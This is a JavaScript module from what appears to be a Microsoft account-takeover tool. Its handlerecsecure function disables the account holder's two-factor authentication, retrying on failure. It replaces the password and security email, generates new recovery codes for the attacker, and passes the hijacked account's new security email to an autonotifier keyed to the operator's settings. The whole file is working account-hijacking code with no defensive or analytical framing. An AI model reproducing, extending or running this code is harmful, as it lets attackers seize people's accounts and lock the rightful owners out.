const disableTfa = require("../secure/disableTfa");
const autonotifier = require("../secure/recode/autonotifier");
const recoveryCodeSecure = require("../secure/recoveryCodeSecure");
const recoveryCode = require("../secure/recoveryCode");


/*
Semi-Secures using recovery code with built-in prot
*/


// Needs more prot







const { safeMetadata } = require("../secure/aliasHelper");

module.exports = async function handlerecsecure(disabledtfa, axios, netid, email, recovery, secEmail, password, settings, apiCanary, tokenobj, retry = 0) {
    console.log(`[handlerecsecure] Processing recovery security (netid: ${safeMetadata(netid)}, recovery: ${safeMetadata(recovery)})`);
    
    if (!disabledtfa){
        console.log(`[handlerecsecure] Retrying to disable 2FA as required`);
        await disableTfa(axios, apiCanary);
    }
    
    console.time("recoveryTime");
    let acc = {
        email: email,
        secEmail: null,
        password: null,
        recoveryCode: null
    };

    let newData = await recoveryCodeSecure(acc.email, recovery, secEmail, password, false);

    if (typeof newData === "string" && newData === "same" || typeof newData === "object" && (newData?.recoveryCode?.includes("couldn't create") || newData?.recoveryCode?.includes("We couldn't create a new recovery code."))) {
        console.log(`Microsoft didn't give us the recovery code, generating fresh one.`);
        acc.secEmail = "Failed (same password error)";
        acc.password = "Failed (same password error)";
        console.time("Generate new recovery after failed recsec");
        acc.recoveryCode = await recoveryCode(axios, netid, apiCanary, tokenobj);
        console.timeEnd("Generate new recovery after failed recsec");
    } else if (typeof newData === "string" && newData === "tfa") {
        console.log(`Cannot secure: 2FA is enabled`);
        if (retry < 1) {
            console.log(`Retrying recovery, disabling 2FA.`);
            try {
                await disableTfa(axios, apiCanary);
            } catch (err) {
                console.log(`Error disabling 2FA: ${err.message}`);
            }
            return await handlerecsecure(disabledtfa, axios, netid, email, recovery, secEmail, password, settings, apiCanary, tokenobj, retry + 1);
        } else {
            console.log(`Couldn't recsecure due to 2FA.`);
            acc.secEmail = "Failed (2FA blocked)";
            acc.password = "Failed (2FA blocked)";
            let fallbackrec = await recoveryCode(axios, netid, apiCanary, tokenobj);
            console.log(`[handlerecsecure] Fallback recovery code obtained: ${safeMetadata(fallbackrec)}`);
            acc.recoveryCode = `${fallbackrec || "none"} (Failed to remove 2FA)`;
        }
    } else if (typeof newData === "object" && newData !== null && newData.password) {
        console.log(`[handlerecsecure] Recovery security details generated successfully (password: ${safeMetadata(newData.password)}, recovery: ${safeMetadata(newData.recoveryCode)})`);
        acc.secEmail = newData.secEmail;
        acc.password = newData.password;
        if (newData.recoveryCode) {
            acc.recoveryCode = newData.recoveryCode;
        } else {
            acc.recoveryCode = await recoveryCode(axios, netid, apiCanary, tokenobj);
        }
    } else {
        console.log(`[handlerecsecure] recoveryCodeSecure failed (returned: ${newData}), password was NOT changed by Microsoft`);
        acc.secEmail = "Failed (recovery secure failed)";
        acc.password = "Failed (recovery secure failed)";
        acc.recoveryCode = await recoveryCode(axios, netid, apiCanary, tokenobj);
    }

    console.timeEnd("recoveryTime");

if (acc.secEmail && acc.secEmail.includes("@")) {      /// idk maybe smth funny will happen
    try {   
        await autonotifier(settings.subscribemail, settings.user_id, acc.secEmail);
    } catch (err) {
        console.error(`autonotifier: ${err}`);
    }
}
    return acc;
};
